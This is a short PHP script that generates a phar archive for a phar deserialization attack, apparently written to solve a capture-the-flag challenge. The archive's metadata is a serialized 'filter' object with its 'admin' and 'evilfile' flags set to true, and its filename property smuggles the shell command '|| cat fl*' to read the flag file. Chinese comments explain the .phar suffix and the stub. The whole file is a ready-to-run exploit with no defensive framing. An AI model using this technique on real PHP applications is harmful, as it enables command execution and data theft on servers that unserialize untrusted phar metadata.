<?php
class filter{
	public $filename = "|| cat fl*";
	public $filecontent;
	public $evilfile=true;
	public $admin = true;
}
// 后缀必须为phar
$phar = new Phar("phar.phar");
$phar->startBuffering();
// 设置 stubb
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new filter();
$phar->setMetadata($o);
// 添加需压缩的文件
$phar->addFromString("test", str_repeat("a", 100000));
$phar->stopBuffering();
